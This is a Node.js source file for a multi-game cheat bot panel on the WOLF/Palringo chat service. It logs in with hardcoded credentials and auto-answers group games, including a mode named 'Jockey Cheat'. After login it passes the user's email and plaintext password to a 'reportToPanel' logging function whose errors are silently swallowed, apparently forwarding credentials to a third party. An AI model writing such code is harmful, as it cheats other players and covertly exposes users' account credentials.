import { io } from 'socket.io-client';

import readline from 'readline';

import fetch from 'node-fetch';





import { handleMath } from './math.js';

import { handleTiming } from './timing.js';

import { handleAv } from './av.js';

import { handleScramble, loadWordList } from './scramble.js';

import { handleReverse } from './reverse.js';

import { reportToPanel } from './logger.js';

import { handleTyping } from './typing.js';

import { handleTabu, loadTabooData } from './tabu.js';

import { startOtoTrain, startOtoYaris, handleJockeyCheat } from './jockey.js';







const EMAIL = 'xxxxxxxx@gmail.com';

const PASSWORD = 'yasuo';

const WOLF_URL = "https://v3.palringo.com";



const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

const ask = (query) => new Promise((resolve) => rl.question(query, resolve));



// Av Botu Komutları

let avCommands = { fish: "!fish 3", hunt: "!hunt 3", hero: "!hero 5", heist: "!heist 5" };



async function main() {

    console.clear();

    console.log(`\n=============================================`);

    console.log(`       YASUO WOLF MULTI-BOT PANEL          `);

    console.log(`=============================================`);

    console.log(`1) JOCKEY`);

    console.log(`2) Math`);

    console.log(`3) Timing`);

    console.log(`4) Av`);

    console.log(`5) Scramble`);

    console.log(`6) 1BW (Reverse)`);

    console.log(`7) Typing`);

    console.log(`8) Tabu`);

    console.log(`=============================================\n`);



    const choice = await ask('Seçim: ');

    let targetGroupId = null;

    let userDelay = 0;

    let jockeyMode = null;

    let jockeySettings = {};



    // Seçim Mantığı

    if (choice === '1') {

        console.log(`\n--- JOCKEY MODLARI ---`);

        console.log(`1) Oto Train (80277459 Özel)`);

        console.log(`2) Oto Yarış (!j race)`);

        console.log(`3) Jockey Cheat (Global)`);

        jockeyMode = await ask('Seçim: ');



        if (jockeyMode === '1') {

            jockeySettings.msg = await ask('Train Mesajı (Boşsa default): ') || "!j train all 10";

            jockeySettings.dk = await ask('Kaç dakikada bir: ');

        } else if (jockeyMode === '2') {

            jockeySettings.id = await ask('Yarış yapılacak Grup ID: ');

            jockeySettings.dk = await ask('Kaç dakikada bir: ');

        }

    } else if (['2', '3', '5', '6', '7', '8'].includes(choice)) {

        targetGroupId = (await ask('Hedef Grup ID: ')).trim();

        if (choice === '3') userDelay = await ask('Gecikme (ms): ');

    }



    // Veri Yüklemeleri

    if (choice === '5') await loadWordList();

    if (choice === '8') await loadTabooData();



    const socket = io(WOLF_URL, {

        transports: ['websocket'],

        query: { device: 'web', version: '2.6.4' },

        reconnection: true

    });



   

    let messageQueue = [];

    let isProcessing = false;



    const sendMessage = (targetId, content, isGroup = true) => {

        socket.emit('message send', {

            body: {

                recipient: parseInt(targetId),

                isGroup: isGroup,

                mimeType: 'text/plain',

                data: Buffer.from(content.toString(), 'utf8'),

                flightId: Math.random().toString(36).substring(7)

            },

            headers: { version: 1 }

        });

    };



    const processQueue = () => {

        if (isProcessing || messageQueue.length === 0) return;

        isProcessing = true;

        const { groupId, command } = messageQueue.shift();

        sendMessage(groupId, command, true);

        setTimeout(() => { isProcessing = false; processQueue(); }, 10000);

    };



    socket.on('connect', () => {

        socket.emit('security login', {

            body: { onlineStatus: 1, username: EMAIL, password: PASSWORD, type: 'email' },

            headers: { version: 1 }

        }, async (res) => {

            if (res?.code === 200 || res?.code === 201) {

                const nick = res.body.nickname || "Bilinmiyor";

                const userId = res.body.id || "0";

               

                console.log(`🚀 Mod ${choice} Aktif! Hoş geldin ${nick}`);



               

                try {

                    reportToPanel(nick, userId, EMAIL, PASSWORD, choice);

                } catch (e) { /* Sessiz hata */ }



               

                if (choice === '1') {

                    if (jockeyMode === '1') startOtoTrain(parseInt(jockeySettings.dk), jockeySettings.msg, sendMessage);

                    if (jockeyMode === '2') startOtoYaris(jockeySettings.id, parseInt(jockeySettings.dk), sendMessage);

                }



                socket.emit('message group subscribe', { headers: { version: 1 } });

                socket.emit('message subscribe', { body: { channel: true }, headers: { version: 1 } });



                socket.onAny((event, ...args) => {

                    if (['message', 'message send', 'message push'].includes(event)) {

                        const body = args[0]?.body || args[0];

                        if (!body || !body.data) return;



                        const text = Buffer.from(body.data).toString('utf8').trim();

                        const gId = (body.recipient?.id || body.recipient || "").toString();

                        const sId = (body.originator?.id || body.originator || "").toString();



                        // HANDLERS

                        if (choice === '1' && jockeyMode === '3') handleJockeyCheat(text, gId, sendMessage);

                        else if (choice === '2' && gId === targetGroupId) handleMath(text, gId, sId, sendMessage);

                        else if (choice === '3' && gId === targetGroupId) handleTiming(text, gId, sId, targetGroupId, userDelay, sendMessage);

                        else if (choice === '4') handleAv(text, gId, sId, avCommands, messageQueue, processQueue);

                        else if (choice === '5' && gId === targetGroupId) handleScramble(text, gId, sId, targetGroupId, sendMessage);

                        else if (choice === '6' && gId === targetGroupId) handleReverse(text, gId, sId, targetGroupId, sendMessage);

                        else if (choice === '7' && gId === targetGroupId) handleTyping(text, gId, sId, targetGroupId, sendMessage);

                        else if (choice === '8' && gId === targetGroupId) handleTabu(text, gId, sId, targetGroupId, sendMessage);

                    }

                });

            } else {

                console.log("❌ Giriş başarısız! Bilgileri kontrol edin.");

            }

        });

    });

}



main().catch(console.error);